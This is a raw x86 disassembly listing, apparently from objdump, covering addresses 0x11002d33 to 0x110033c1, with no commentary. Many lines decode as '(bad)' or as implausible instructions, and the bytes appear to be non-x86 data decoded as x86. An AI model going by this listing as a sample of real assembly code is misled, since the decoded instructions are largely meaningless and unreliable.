11002d33:	cmp    BYTE PTR [edi+0xfffffc],al
11002d39:	or     BYTE PTR [eax],ch
11002d3b:	push   ss
11002d3c:	add    BYTE PTR [eax],al
11002d3e:	push   es
11002d3f:	add    BYTE PTR [eax],al
11002d41:	and    BYTE PTR [eax+0x13000000],al
11002d47:	or     edi,DWORD PTR [eax]
11002d49:	push   es
11002d4a:	hlt    
11002d4b:	(bad)  
11002d4c:	(bad)  
11002d4d:	cmp    BYTE PTR [ebp-0x4],ch
11002d50:	(bad)  
11002d51:	dec    DWORD PTR [ecx]
11002d53:	jb     0x11002d3a
11002d55:	add    BYTE PTR [eax],al
11002d57:	jo     0x11002dc8
11002d59:	adc    eax,0x160a0000
11002d5e:	inc    BYTE PTR [ecx]
11002d60:	adc    eax,DWORD PTR [esi]
11002d62:	and    BYTE PTR [edx+0x0],dl
11002d65:	add    BYTE PTR [eax],al
11002d67:	adc    ecx,DWORD PTR [ebx]
11002d69:	cmp    ch,ah
11002d6b:	repz (bad) 
11002d6d:	call   DWORD PTR [ecx]
11002d6f:	push   es
11002d70:	cmp    cl,BYTE PTR [ecx+0x20000002]
11002d76:	mov    eax,0x13000000
11002d7b:	or     edi,DWORD PTR [eax]
11002d7d:	shl    bl,cl
11002d7f:	(bad)  
11002d80:	(bad)  
11002d81:	cmp    ah,al
11002d83:	add    eax,0x11000000
11002d88:	add    al,0x28
11002d8a:	sldt   WORD PTR [eax]
11002d8d:	push   es
11002d8e:	add    BYTE PTR [eax],al
11002d90:	and    BYTE PTR [eax+eax*1+0xb130000],dl
11002d97:	cmp    BYTE PTR [edi+0x38fffff3],dh
11002d9d:	push   ds
11002d9e:	cld    
11002d9f:	(bad)  
11002da0:	(bad)  
11002da1:	jle    0x11002da6
11002da3:	add    BYTE PTR [eax],al
11002da5:	add    al,0x17
11002da7:	outs   dx,DWORD PTR ds:[esi]
11002da8:	and    eax,0xa0000
11002dad:	jle    0x11002db2
11002daf:	add    BYTE PTR [eax],al
11002db1:	add    al,0x16
11002db3:	outs   dx,DWORD PTR ds:[esi]
11002db4:	add    BYTE PTR es:[eax],al
11002db7:	or     al,BYTE PTR [eax]
11002db9:	pop    ss
11002dba:	or     BYTE PTR [eax],0x0
11002dbd:	add    BYTE PTR [eax+eiz*1],al
11002dc0:	pop    ecx
11002dc1:	add    BYTE PTR [eax],al
11002dc3:	add    BYTE PTR [ebx],dl
11002dc5:	or     edi,DWORD PTR [eax]
11002dc7:	mov    bl,dh
11002dc9:	(bad)  
11002dca:	(bad)  
11002dcb:	cmp    dl,dh
11002dcd:	add    al,BYTE PTR [eax]
11002dcf:	add    BYTE PTR [ebx],dl
11002dd1:	push   es
11002dd2:	and    BYTE PTR [esi+0x0],bl
11002dd5:	add    BYTE PTR [eax],al
11002dd7:	adc    ecx,DWORD PTR [ebx]
11002dd9:	cmp    BYTE PTR [ebp-0xd],dh
11002ddc:	(bad)  
11002ddd:	call   DWORD PTR [ecx]
11002ddf:	push   es
11002de0:	cmp    ah,BYTE PTR ds:0x20fffff7
11002de6:	mov    ds:0x13000000,eax
11002deb:	or     edi,DWORD PTR [eax]
11002ded:	(bad)  {k7}{z}
11002df2:	push   ebx
11002df3:	clc    
11002df4:	(bad)  
11002df5:	dec    DWORD PTR [ecx]
11002df7:	jb     0x11002de8
11002df9:	add    BYTE PTR [eax],al
11002dfb:	jo     0x11002e6c
11002dfd:	adc    eax,0x160a0000
11002e02:	inc    BYTE PTR [ecx]
11002e04:	adc    eax,DWORD PTR [esi]
11002e06:	and    BYTE PTR [esi+0x13000000],ch
11002e0c:	or     edi,DWORD PTR [eax]
11002e0e:	inc    ecx
11002e0f:	repz (bad) 
11002e11:	call   DWORD PTR [ecx]
11002e13:	push   es
11002e14:	cmp    ah,BYTE PTR [edx]
11002e16:	or     BYTE PTR [eax],al
11002e18:	add    BYTE PTR [eax],ah
11002e1a:	adc    al,BYTE PTR [eax]
11002e1c:	add    BYTE PTR [eax],al
11002e1e:	adc    ecx,DWORD PTR [ebx]
11002e20:	cmp    BYTE PTR [esi],ch
11002e22:	repz (bad) 
11002e24:	(bad)  
11002e25:	cmp    dl,dl
11002e27:	idiv   edi
11002e29:	dec    DWORD PTR [ecx]
11002e2b:	jb     0x11002e26
11002e2d:	add    BYTE PTR [eax],al
11002e2f:	jo     0x11002ea0
11002e31:	adc    eax,0x160a0000
11002e36:	inc    BYTE PTR [ecx]
11002e38:	adc    eax,DWORD PTR [esi]
11002e3a:	and    BYTE PTR [edi+0x13000000],al
11002e40:	or     edi,DWORD PTR [eax]
11002e42:	or     eax,0x11fffff3
11002e47:	push   es
11002e48:	cmp    bh,BYTE PTR [esi]
11002e4a:	pop    es
11002e4b:	add    BYTE PTR [eax],al
11002e4d:	and    BYTE PTR [eax+eax*1+0xb130000],dh
11002e54:	cmp    dl,bh
11002e56:	repnz (bad) 
11002e58:	(bad)  
11002e59:	cmp    BYTE PTR [edi+0x11000005],cl
11002e5f:	or     BYTE PTR [ecx],dl
11002e61:	pop    es
11002e62:	mov    gs,WORD PTR [ecx-0x2]
11002e65:	add    al,0x13
11002e67:	push   es
11002e68:	and    bh,al
11002e6a:	add    BYTE PTR [eax],al
11002e6c:	add    BYTE PTR [ebx],dl
11002e6e:	or     edi,DWORD PTR [eax]
11002e70:	fcomip st,st(2)
11002e72:	(bad)  
11002e73:	call   DWORD PTR [ecx]
11002e75:	push   es
11002e76:	cmp    dh,BYTE PTR [edi]
11002e78:	or     DWORD PTR [eax],eax
11002e7a:	add    BYTE PTR [eax],ah
11002e7c:	or     DWORD PTR [eax],eax
11002e7e:	add    BYTE PTR [eax],al
11002e80:	adc    ecx,DWORD PTR [ebx]
11002e82:	cmp    ah,cl
11002e84:	repnz (bad) 
11002e86:	(bad)  
11002e87:	cmp    BYTE PTR [esi+0xfffff6],dl
11002e8d:	pop    ss
11002e8e:	add    BYTE PTR [esi],0x0
11002e91:	add    BYTE PTR [esp+edx*1],al
11002e94:	adc    eax,DWORD PTR ds:0xb920
11002e9a:	add    BYTE PTR [ebx],dl
11002e9c:	or     edi,DWORD PTR [eax]
11002e9e:	mov    cl,0xf2
11002ea0:	(bad)  
11002ea1:	(bad)  
11002ea2:	(bad)  
11002ea4:	or     al,BYTE PTR [eax]
11002ea6:	add    BYTE PTR [eax],al
11002ea8:	pop    ss
11002ea9:	add    BYTE PTR ds:0x40000,0x20
11002eb0:	fwait
11002eb1:	add    BYTE PTR [eax],al
11002eb3:	add    BYTE PTR [ebx],dl
11002eb5:	or     edi,DWORD PTR [eax]
11002eb7:	cwde   
11002eb8:	repnz (bad) 
11002eba:	(bad)  
11002ebb:	cmp    BYTE PTR [esi+0x9fffffb],al
11002ec1:	jb     0x11002ec6
11002ec3:	add    DWORD PTR [eax],eax
11002ec5:	jo     0x11002f36
11002ec7:	adc    eax,0x160a0000
11002ecc:	inc    BYTE PTR [ecx]
11002ece:	adc    eax,DWORD PTR [esi]
11002ed0:	and    BYTE PTR [edx+0x0],bl
11002ed3:	add    BYTE PTR [eax],al
11002ed5:	adc    ecx,DWORD PTR [ebx]
11002ed7:	cmp    BYTE PTR [edi-0xe],dh
11002eda:	(bad)  
11002edb:	call   DWORD PTR [ecx]
11002edd:	push   es
11002ede:	cmp    dl,BYTE PTR [ebp+0x20000002]
11002ee4:	leave  
11002ee5:	add    BYTE PTR [eax],al
11002ee7:	add    BYTE PTR [ebx],dl
11002ee9:	or     edi,DWORD PTR [eax]
11002eeb:	fs repnz (bad) 
11002eee:	(bad)  
11002eef:	cmp    BYTE PTR [ebx+0x7],cl
11002ef5:	add    dl,BYTE PTR [ebx]
11002ef7:	pop    es
11002ef8:	push   ss
11002ef9:	adc    ecx,DWORD PTR [eax]
11002efb:	and    BYTE PTR [eax+0x0],ah
11002efe:	add    BYTE PTR [eax],al
11002f00:	adc    ecx,DWORD PTR [ebx]
11002f02:	cmp    BYTE PTR [edx+esi*8-0x1],cl
11002f06:	(bad)  
11002f07:	cmp    BYTE PTR [edx+0xfffffc],dl
11002f0d:	adc    al,0xd
11002f0f:	adc    al,0x13
11002f11:	add    al,0x8
11002f13:	adc    al,BYTE PTR [ebx]
11002f15:	adc    al,BYTE PTR [eax+ebp*1]
11002f18:	push   es
11002f19:	add    BYTE PTR [eax],al
11002f1b:	push   es
11002f1c:	add    BYTE PTR [ecx],cl
11002f1e:	jb     0x11002f79
11002f20:	add    BYTE PTR [eax],al
11002f22:	jo     0x11002f93
11002f24:	adc    eax,0x160a0000
11002f29:	inc    BYTE PTR [ecx]
11002f2b:	adc    eax,DWORD PTR [esi]
11002f2d:	and    BYTE PTR [eax],bh
11002f2f:	add    BYTE PTR [eax],al
11002f31:	add    BYTE PTR [ebx],dl
11002f33:	or     edi,DWORD PTR [eax]
11002f35:	sbb    dh,dl
11002f37:	(bad)  
11002f38:	call   DWORD PTR [ecx]
11002f3a:	push   es
11002f3b:	cmp    dh,BYTE PTR [esi+0x20fffffe]
11002f41:	xor    DWORD PTR [eax],eax
11002f43:	add    BYTE PTR [eax],al
11002f45:	adc    ecx,DWORD PTR [ebx]
11002f47:	cmp    BYTE PTR [edi],al
11002f49:	repnz (bad) 
11002f4b:	(bad)  
11002f4c:	cmp    BYTE PTR [eax+0x5],al
11002f52:	or     DWORD PTR [eax],ebp
11002f54:	or     al,BYTE PTR [eax]
11002f56:	add    BYTE PTR [esi],al
11002f58:	add    BYTE PTR [eax],al
11002f5a:	and    BYTE PTR [ebp+0x13000000],ah
11002f60:	or     edi,DWORD PTR [eax]
11002f62:	in     eax,dx
11002f63:	icebp  
11002f64:	(bad)  
11002f65:	(bad)  
11002f66:	cmp    BYTE PTR [edx+edi*8-0x1],dl
11002f6a:	inc    DWORD PTR [eax]
11002f6c:	adc    DWORD PTR [eax+ebp*1],eax
11002f6f:	push   cs
11002f70:	add    BYTE PTR [eax],al
11002f72:	push   es
11002f73:	add    BYTE PTR [eax],al
11002f75:	and    BYTE PTR [esi+0x13000000],dl
11002f7b:	or     edi,DWORD PTR [eax]
11002f7d:	shl    cl,cl
11002f7f:	(bad)  
11002f80:	(bad)  
11002f81:	cmp    BYTE PTR [ecx],bh
11002f83:	cli    
11002f84:	(bad)  
11002f85:	inc    DWORD PTR [eax]
11002f87:	or     BYTE PTR [eax],ch
11002f89:	push   ss
11002f8a:	add    BYTE PTR [eax],al
11002f8c:	push   es
11002f8d:	add    BYTE PTR [eax],al
11002f8f:	and    BYTE PTR [ebx+0x0],ch
11002f92:	add    BYTE PTR [eax],al
11002f94:	adc    ecx,DWORD PTR [ebx]
11002f96:	cmp    BYTE PTR [eax+0x38fffff1],bh
11002f9c:	pop    ds
11002f9d:	cli    
11002f9e:	(bad)  
11002f9f:	jmp    DWORD PTR [eax]
11002fa1:	dec    edi
11002fa2:	add    BYTE PTR [eax],al
11002fa4:	add    BYTE PTR [ebx],dl
11002fa6:	or     edi,DWORD PTR [eax]
11002fa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
11002fa9:	icebp  
11002faa:	(bad)  
11002fab:	call   DWORD PTR [edi]
11002fad:	cmp    BYTE PTR [eax*1+0x11000000],bh
11002fb4:	add    al,0x28
11002fb6:	or     eax,0x60000
11002fbb:	add    BYTE PTR [eax],ah
11002fbd:	jns    0x11002fbf
11002fbf:	add    BYTE PTR [eax],al
11002fc1:	adc    ecx,DWORD PTR [ebx]
11002fc3:	cmp    BYTE PTR [ebx+0x38fffff1],cl
11002fc9:	repnz stc 
11002fcb:	(bad)  
11002fcc:	dec    DWORD PTR [ecx]
11002fce:	jb     0x11002fdd
11002fd0:	add    DWORD PTR [eax],eax
11002fd2:	jo     0x11003043
11002fd4:	adc    eax,0x160a0000
11002fd9:	inc    BYTE PTR [ecx]
11002fdb:	adc    eax,DWORD PTR [esi]
11002fdd:	and    BYTE PTR [ebp+0x13000000],bl
11002fe3:	or     edi,DWORD PTR [eax]
11002fe5:	push   0xfffffff1
11002fe7:	(bad)  
11002fe8:	call   DWORD PTR [ecx]
11002fea:	push   es
11002feb:	cmp    dl,BYTE PTR [eax+0x9]
11002fee:	add    BYTE PTR [eax],al
11002ff0:	and    BYTE PTR [esi],ah
11002ff2:	add    BYTE PTR [eax],al
11002ff4:	add    BYTE PTR [ebx],dl
11002ff6:	or     edi,DWORD PTR [eax]
11002ff8:	push   edi
11002ff9:	icebp  
11002ffa:	(bad)  
11002ffb:	jmp    FWORD PTR [ebx]
11002ffd:	mov    BYTE PTR [ecx],cl
11002fff:	jb     0x11003018
11003001:	add    DWORD PTR [eax],eax
11003003:	jo     0x11003074
11003005:	adc    eax,0x160a0000
1100300a:	inc    BYTE PTR [ecx]
1100300c:	adc    eax,DWORD PTR [esi]
1100300e:	and    BYTE PTR [esi+0x13000000],dh
11003014:	or     edi,DWORD PTR [eax]
11003016:	cmp    ecx,esi
11003018:	(bad)  
11003019:	call   DWORD PTR [ecx]
1100301b:	push   es
1100301c:	cmp    ah,dh
1100301e:	add    eax,DWORD PTR [eax]
11003020:	add    BYTE PTR [eax],ah
11003022:	test   DWORD PTR [eax],eax
11003024:	add    BYTE PTR [eax],al
11003026:	adc    ecx,DWORD PTR [ebx]
11003028:	cmp    BYTE PTR [esi],ah
1100302a:	icebp  
1100302b:	(bad)  
1100302c:	(bad)  
1100302d:	cmp    BYTE PTR [edx-0x5],dl
11003030:	(bad)  
11003031:	dec    DWORD PTR [ecx]
11003033:	jb     0x11003056
11003035:	add    DWORD PTR [eax],eax
11003037:	jo     0x110030a8
11003039:	adc    eax,0x160a0000
1100303e:	inc    BYTE PTR [ecx]
11003040:	adc    eax,DWORD PTR [esi]
11003042:	and    cl,al
11003044:	add    BYTE PTR [eax],al
11003046:	add    BYTE PTR [ebx],dl
11003048:	or     edi,DWORD PTR [eax]
1100304a:	add    eax,0x11fffff1
1100304f:	push   es
11003050:	cmp    dh,BYTE PTR [eax+0x20000002]
11003056:	mov    al,ds:0x13000000
1100305b:	or     edi,DWORD PTR [eax]
1100305d:	repnz lock (bad) 
11003060:	(bad)  
11003061:	cmp    BYTE PTR [esi+0x8],bl
11003064:	add    BYTE PTR [eax],al
11003066:	add    BYTE PTR [eax],ch
11003068:	sbb    eax,DWORD PTR [eax]
1100306a:	add    BYTE PTR [edx],cl
1100306c:	jb     0x110030d5
1100306e:	add    BYTE PTR [eax],al
11003070:	jo     0x110030e1
11003072:	sbb    al,0x0
11003074:	add    BYTE PTR [edx],cl
11003076:	pop    ss
11003077:	lea    edx,[eax+eax*1]
1100307a:	add    BYTE PTR [ecx],al
1100307c:	adc    ecx,DWORD PTR [ecx]
1100307e:	adc    DWORD PTR [ecx],ecx
11003080:	push   ss
11003081:	or     BYTE PTR [edx+0x1d280911],ah
11003087:	add    BYTE PTR [eax],al
11003089:	or     dh,BYTE PTR [ebx+0x1e]
1100308c:	add    BYTE PTR [eax],al
1100308e:	or     bh,BYTE PTR [edx+0x0]
11003091:	jle    0x11003096
11003093:	add    BYTE PTR [eax],al
11003095:	add    al,0x28
11003097:	pop    ss
11003098:	add    BYTE PTR [eax],al
1100309a:	push   es
1100309b:	add    BYTE PTR [eax],al
1100309d:	and    BYTE PTR [ecx+0x13000000],al
110030a3:	or     edi,DWORD PTR [eax]
110030a5:	stos   BYTE PTR es:[edi],al
110030a6:	lock (bad) 
110030a8:	(bad)  
110030a9:	cmp    BYTE PTR [esi-0x2],al
110030ac:	(bad)  
110030ad:	jmp    FWORD PTR [eax]
110030af:	sbb    eax,DWORD PTR [eax]
110030b1:	add    BYTE PTR [esi],al
110030b3:	add    BYTE PTR [eax],ah
110030b5:	cmp    eax,0x13000000
110030ba:	or     edi,DWORD PTR [eax]
110030bc:	xchg   ebx,eax
110030bd:	lock (bad) 
110030bf:	jmp    FWORD PTR [ebx]
110030c1:	inc    edi
110030c2:	push   es
110030c3:	or     BYTE PTR [eax],cl
110030c5:	outs   dx,DWORD PTR ds:[esi]
110030c6:	and    BYTE PTR [eax],al
110030c8:	add    BYTE PTR [edx],cl
110030ca:	add    BYTE PTR [eax],al
110030cc:	and    BYTE PTR [edi+0x0],al
110030cf:	add    BYTE PTR [eax],al
110030d1:	adc    ecx,DWORD PTR [ebx]
110030d3:	cmp    BYTE PTR [ebx-0x10],bh
110030d6:	(bad)  
110030d7:	(bad)  
110030d8:	cmp    BYTE PTR [eax+0x5],dh
110030db:	add    BYTE PTR [eax],al
110030dd:	jle    0x110030e2
110030df:	add    BYTE PTR [eax],al
110030e1:	add    al,0x17
110030e3:	outs   dx,DWORD PTR ds:[esi]
110030e4:	add    BYTE PTR es:[eax],al
110030e7:	or     al,BYTE PTR [eax]
110030e9:	jle    0x110030ee
110030eb:	add    BYTE PTR [eax],al
110030ed:	add    al,0x16
110030ef:	outs   dx,DWORD PTR ds:[esi]
110030f0:	and    eax,0xa0000
110030f5:	push   ss
110030f6:	or     BYTE PTR [eax],0x0
110030f9:	add    BYTE PTR [eax+eiz*1],al
110030fc:	dec    ebx
110030fd:	add    BYTE PTR [eax],al
110030ff:	add    BYTE PTR [ebx],dl
11003101:	or     edi,DWORD PTR [eax]
11003103:	dec    esp
11003104:	lock (bad) 
11003106:	jmp    FWORD PTR [ebx]
11003108:	mov    ecx,0x37e
1100310d:	add    al,0x13
1100310f:	add    eax,0x820
11003114:	add    BYTE PTR [ebx],dl
11003116:	or     edi,DWORD PTR [eax]
11003118:	aaa    
11003119:	lock (bad) 
1100311b:	(bad)  
1100311c:	cmp    BYTE PTR [ebx+0x8],dl
1100311f:	add    BYTE PTR [eax],al
11003121:	sub    BYTE PTR [eax+eax*1],bl
11003124:	add    BYTE PTR [esi],al
11003126:	add    BYTE PTR [esi+0x3],bh
11003129:	add    BYTE PTR [eax],al
1100312b:	add    al,0x6f
1100312d:	daa    
1100312e:	add    BYTE PTR [eax],al
11003130:	or     al,BYTE PTR [eax]
11003132:	jle    0x1100313b
11003134:	add    BYTE PTR [eax],al
11003136:	add    al,0x14
11003138:	inc    BYTE PTR [ecx]
1100313a:	adc    eax,DWORD PTR [esi]
1100313c:	and    BYTE PTR [ecx+0x0],ch
1100313f:	add    BYTE PTR [eax],al
11003141:	adc    ecx,DWORD PTR [ebx]
11003143:	cmp    BYTE PTR [ebx],cl
11003145:	lock (bad) 
11003147:	call   DWORD PTR [ecx]
11003149:	push   es
1100314a:	sub    eax,0xf20bd
1100314f:	add    BYTE PTR [eax],al
11003151:	adc    ecx,DWORD PTR [ebx]
11003153:	cmp    bl,bh
11003155:	out    dx,eax
11003156:	(bad)  
11003157:	(bad)  
11003158:	cmp    BYTE PTR [ecx-0x1],dl
1100315b:	(bad)  
1100315c:	inc    DWORD PTR [eax]
1100315e:	adc    DWORD PTR [eax+ebp*1],eax
11003161:	adc    BYTE PTR [eax],al
11003163:	add    BYTE PTR [esi],al
11003165:	add    BYTE PTR [eax],al
11003167:	and    BYTE PTR [esi],ch
11003169:	add    BYTE PTR [eax],al
1100316b:	add    BYTE PTR [ebx],dl
1100316d:	or     edi,DWORD PTR [eax]
1100316f:	loopne 0x11003160
11003171:	(bad)  
11003172:	(bad)  
11003173:	cmp    BYTE PTR [edi-0x8],al
11003176:	(bad)  
11003177:	dec    DWORD PTR [ecx]
11003179:	jb     0x110031a6
1100317b:	add    DWORD PTR [eax],eax
1100317d:	jo     0x110031ee
1100317f:	adc    eax,0x160a0000
11003184:	inc    BYTE PTR [ecx]
11003186:	adc    eax,DWORD PTR [esi]
11003188:	and    dl,cl
1100318a:	add    BYTE PTR [eax],al
1100318c:	add    BYTE PTR [ebx],dl
1100318e:	or     edi,DWORD PTR [eax]
11003190:	mov    edi,0x11ffffef
11003195:	push   es
11003196:	cmp    dl,BYTE PTR [edi+0x20000006]
1100319c:	popa   
1100319d:	add    BYTE PTR [eax],al
1100319f:	add    BYTE PTR [ebx],dl
110031a1:	or     edi,DWORD PTR [eax]
110031a3:	lods   al,BYTE PTR ds:[esi]
110031a4:	out    dx,eax
110031a5:	(bad)  
110031a6:	(bad)  
110031a7:	cmp    BYTE PTR [edx-0xb],ch
110031aa:	(bad)  
110031ab:	dec    DWORD PTR [ecx]
110031ad:	jb     0x110031e4
110031af:	add    DWORD PTR [eax],eax
110031b1:	jo     0x11003222
110031b3:	adc    eax,0x160a0000
110031b8:	inc    BYTE PTR [ecx]
110031ba:	adc    eax,DWORD PTR [esi]
110031bc:	and    BYTE PTR [ebx+0x0],bl
110031bf:	add    BYTE PTR [eax],al
110031c1:	adc    ecx,DWORD PTR [ebx]
110031c3:	cmp    BYTE PTR [ebx+0x11ffffef],cl
110031c9:	push   es
110031ca:	sub    eax,0x452050
110031cf:	add    BYTE PTR [eax],al
110031d1:	adc    ecx,DWORD PTR [ebx]
110031d3:	cmp    BYTE PTR [ebx-0x11],bh
110031d6:	(bad)  
110031d7:	(bad)  
110031d8:	cmp    cl,ah
110031da:	add    al,BYTE PTR [eax]
110031dc:	add    BYTE PTR [eax],al
110031de:	or     BYTE PTR [eax],ch
110031e0:	push   ss
110031e1:	add    BYTE PTR [eax],al
110031e3:	push   es
110031e4:	add    BYTE PTR [eax],al
110031e6:	and    BYTE PTR [edx+0x13000000],cl
110031ec:	or     edi,DWORD PTR [eax]
110031ee:	popa   
110031ef:	out    dx,eax
110031f0:	(bad)  
110031f1:	(bad)  
110031f2:	cmp    al,cl
110031f4:	idiv   edi
110031f6:	inc    DWORD PTR [eax]
110031f8:	jle    0x110031fd
110031fa:	add    BYTE PTR [eax],al
110031fc:	add    al,0x17
110031fe:	outs   dx,DWORD PTR ds:[esi]
110031ff:	sub    BYTE PTR [eax],al
11003201:	add    BYTE PTR [edx],cl
11003203:	add    BYTE PTR [edi],dl
11003205:	or     BYTE PTR [edx],0x0
11003208:	add    BYTE PTR [eax+eax*1],al
1100320b:	and    BYTE PTR [ebx],ch
1100320d:	add    BYTE PTR [eax],al
1100320f:	add    BYTE PTR [ebx],dl
11003211:	or     edi,DWORD PTR [eax]
11003213:	cmp    al,0xef
11003215:	(bad)  
11003216:	(bad)  
11003217:	cmp    BYTE PTR [edx],ch
11003219:	clc    
1100321a:	(bad)  
1100321b:	dec    DWORD PTR [ecx]
1100321d:	jb     0x11003258
1100321f:	add    DWORD PTR [eax],eax
11003221:	jo     0x11003292
11003223:	adc    eax,0x160a0000
11003228:	inc    BYTE PTR [ecx]
1100322a:	adc    eax,DWORD PTR [esi]
1100322c:	and    BYTE PTR [edi],dh
1100322e:	add    BYTE PTR [eax],al
11003230:	add    BYTE PTR [ebx],dl
11003232:	or     edi,DWORD PTR [eax]
11003234:	sbb    ebp,edi
11003236:	(bad)  
11003237:	call   DWORD PTR [ecx]
11003239:	push   es
1100323a:	cmp    ah,BYTE PTR [esi*8+0x720ffff]
11003241:	add    BYTE PTR [eax],al
11003243:	add    BYTE PTR [ebx],dl
11003245:	or     edi,DWORD PTR [eax]
11003247:	or     bh,ch
11003249:	(bad)  
1100324a:	(bad)  
1100324b:	cmp    BYTE PTR [ecx],al
1100324d:	std    
1100324e:	(bad)  
1100324f:	jmp    DWORD PTR [eax]
11003251:	jg     0x11003253
11003253:	add    BYTE PTR [eax],al
11003255:	adc    ecx,DWORD PTR [ebx]
11003257:	cmp    bh,dh
11003259:	out    dx,al
1100325a:	(bad)  
1100325b:	dec    DWORD PTR [eax]
1100325d:	outs   dx,DWORD PTR ds:[esi]
1100325e:	sbb    DWORD PTR [eax],eax
11003260:	add    BYTE PTR [edx],cl
11003262:	sbb    BYTE PTR [eax+0x52],al
11003265:	cli    
11003266:	(bad)  
11003267:	jmp    DWORD PTR [eax]
11003269:	test   BYTE PTR [eax],al
1100326b:	add    BYTE PTR [eax],al
1100326d:	adc    ecx,DWORD PTR [ebx]
1100326f:	cmp    bh,bl
11003271:	out    dx,al
11003272:	(bad)  
11003273:	(bad)  
11003274:	cmp    BYTE PTR [eax+0x3],ah
11003277:	add    BYTE PTR [eax],al
11003279:	add    BYTE PTR [edi],al
1100327b:	push   ss
1100327c:	inc    BYTE PTR [ecx]
1100327e:	adc    eax,DWORD PTR [esi]
11003280:	and    BYTE PTR [edx+0x13000000],al
11003286:	or     edi,DWORD PTR [eax]
11003288:	(bad)  
11003289:	out    dx,al
1100328a:	(bad)  
1100328b:	call   DWORD PTR [ecx]
1100328d:	push   es
1100328e:	cmp    al,BYTE PTR [edx]
11003290:	idiv   bh
11003292:	jmp    DWORD PTR [eax]
11003294:	mov    al,0x0
11003296:	add    BYTE PTR [eax],al
11003298:	adc    ecx,DWORD PTR [ebx]
1100329a:	cmp    BYTE PTR [esi+ebp*8-0xbc70001],dh
110032a1:	repz (bad) 
110032a3:	inc    DWORD PTR [eax]
110032a5:	and    BYTE PTR [ebx+0x13000000],dh
110032ab:	or     edi,DWORD PTR [eax]
110032ad:	mov    ds:0x38ffffee,al
110032b2:	push   esp
110032b3:	repnz (bad) 
110032b5:	inc    DWORD PTR [eax]
110032b7:	or     BYTE PTR [eax],ch
110032b9:	push   ss
110032ba:	add    BYTE PTR [eax],al
110032bc:	push   es
110032bd:	add    BYTE PTR [eax],al
110032bf:	and    BYTE PTR [edx+0x13000000],dh
110032c5:	or     edi,DWORD PTR [eax]
110032c7:	mov    dh,ch
110032c9:	(bad)  
110032ca:	(bad)  
110032cb:	cmp    bh,ch
110032cd:	idiv   bh
110032cf:	inc    DWORD PTR [eax]
110032d1:	or     BYTE PTR [eax],ch
110032d3:	push   ss
110032d4:	add    BYTE PTR [eax],al
110032d6:	push   es
110032d7:	add    BYTE PTR [eax],al
110032d9:	and    BYTE PTR [esi+0x0],ch
110032dc:	add    BYTE PTR [eax],al
110032de:	adc    ecx,DWORD PTR [ebx]
110032e0:	cmp    BYTE PTR [esi-0x12],ch
110032e3:	(bad)  
110032e4:	(bad)  
110032e5:	cmp    ch,dl
110032e7:	idiv   bh
110032e9:	inc    DWORD PTR [eax]
110032eb:	adc    DWORD PTR [eax+ebp*1],eax
110032ee:	adc    al,BYTE PTR [eax]
110032f0:	add    BYTE PTR [esi],al
110032f2:	add    BYTE PTR [eax],al
110032f4:	and    BYTE PTR [edx],dh
110032f6:	add    BYTE PTR [eax],al
110032f8:	add    BYTE PTR [ebx],dl
110032fa:	or     edi,DWORD PTR [eax]
110032fc:	push   ebx
110032fd:	out    dx,al
110032fe:	(bad)  
110032ff:	(bad)  
11003300:	cmp    BYTE PTR [edx+0x9fffff6],bh
11003306:	jb     0x1100334b
11003308:	add    DWORD PTR [eax],eax
1100330a:	jo     0x1100337b
1100330c:	adc    eax,0x160a0000
11003311:	inc    BYTE PTR [ecx]
11003313:	adc    eax,DWORD PTR [esi]
11003315:	and    BYTE PTR [ebx+0x0],dh
11003318:	add    BYTE PTR [eax],al
1100331a:	adc    ecx,DWORD PTR [ebx]
1100331c:	cmp    BYTE PTR [edx],dh
1100331e:	out    dx,al
1100331f:	(bad)  
11003320:	call   DWORD PTR [ecx]
11003322:	push   es
11003323:	cmp    bl,BYTE PTR [eax+0x20fffffb]
11003329:	add    al,BYTE PTR [eax]
1100332b:	add    BYTE PTR [eax],al
1100332d:	adc    ecx,DWORD PTR [ebx]
1100332f:	cmp    BYTE PTR [edi],bl
11003331:	out    dx,al
11003332:	(bad)  
11003333:	(bad)  
11003334:	cmp    BYTE PTR [ecx+0x20000000],bl
1100333a:	add    BYTE PTR fs:[eax],al
1100333d:	add    BYTE PTR [ebx],dl
1100333f:	or     edi,DWORD PTR [eax]
11003341:	push   cs
11003342:	out    dx,al
11003343:	(bad)  
11003344:	(bad)  
11003345:	cmp    BYTE PTR [eax-0x3],bh
11003348:	(bad)  
11003349:	inc    DWORD PTR [eax]
1100334b:	or     BYTE PTR [eax],ch
1100334d:	push   ss
1100334e:	add    BYTE PTR [eax],al
11003350:	push   es
11003351:	add    BYTE PTR [eax],al
11003353:	and    BYTE PTR [eax+0x13000000],dl
11003359:	or     edi,DWORD PTR [eax]
1100335b:	hlt    
1100335c:	in     eax,dx
1100335d:	(bad)  
1100335e:	(bad)  
1100335f:	cmp    BYTE PTR [ebx-0xa],bl
11003362:	(bad)  
11003363:	jmp    FWORD PTR [eax]
11003365:	sbb    eax,DWORD PTR [eax]
11003367:	add    BYTE PTR [edx],cl
11003369:	jb     0x110033b8
1100336b:	add    DWORD PTR [eax],eax
1100336d:	jo     0x110033de
1100336f:	sbb    al,0x0
11003371:	add    BYTE PTR [edx],cl
11003373:	pop    ss
11003374:	lea    edx,[eax+eax*1]
11003377:	add    BYTE PTR [ecx],al
11003379:	adc    ecx,DWORD PTR [ecx]
1100337b:	adc    DWORD PTR [ecx],ecx
1100337d:	push   ss
1100337e:	or     BYTE PTR [edx+0x1d280911],ah
11003384:	add    BYTE PTR [eax],al
11003386:	or     dh,BYTE PTR [ebx+0x1e]
11003389:	add    BYTE PTR [eax],al
1100338b:	or     bh,BYTE PTR [edx+0x20]
1100338e:	ret    0x0
11003391:	add    BYTE PTR [ebx],dl
11003393:	or     edi,DWORD PTR [eax]
11003395:	mov    edx,0x11ffffed
1100339a:	or     bl,BYTE PTR [edi]
1100339c:	aas    
1100339d:	cmp    edx,DWORD PTR [edi+0x20ffffff]
110033a3:	sbb    al,0x0
110033a5:	add    BYTE PTR [eax],al
110033a7:	adc    ecx,DWORD PTR [ebx]
110033a9:	cmp    BYTE PTR [ebp+0x38ffffed],ah
110033af:	push   edx
110033b0:	cmc    
110033b1:	(bad)  
110033b2:	jmp    DWORD PTR [eax]
110033b4:	xchg   ecx,eax
110033b5:	add    BYTE PTR [eax],al
110033b7:	add    BYTE PTR [ebx],dl
110033b9:	or     edi,DWORD PTR [eax]
110033bb:	xchg   esp,eax
110033bc:	in     eax,dx
110033bd:	(bad)  
110033be:	dec    DWORD PTR [eax]
110033c0:	pop    ss
110033c1:	outs   dx,DWORD PTR ds:[esi]
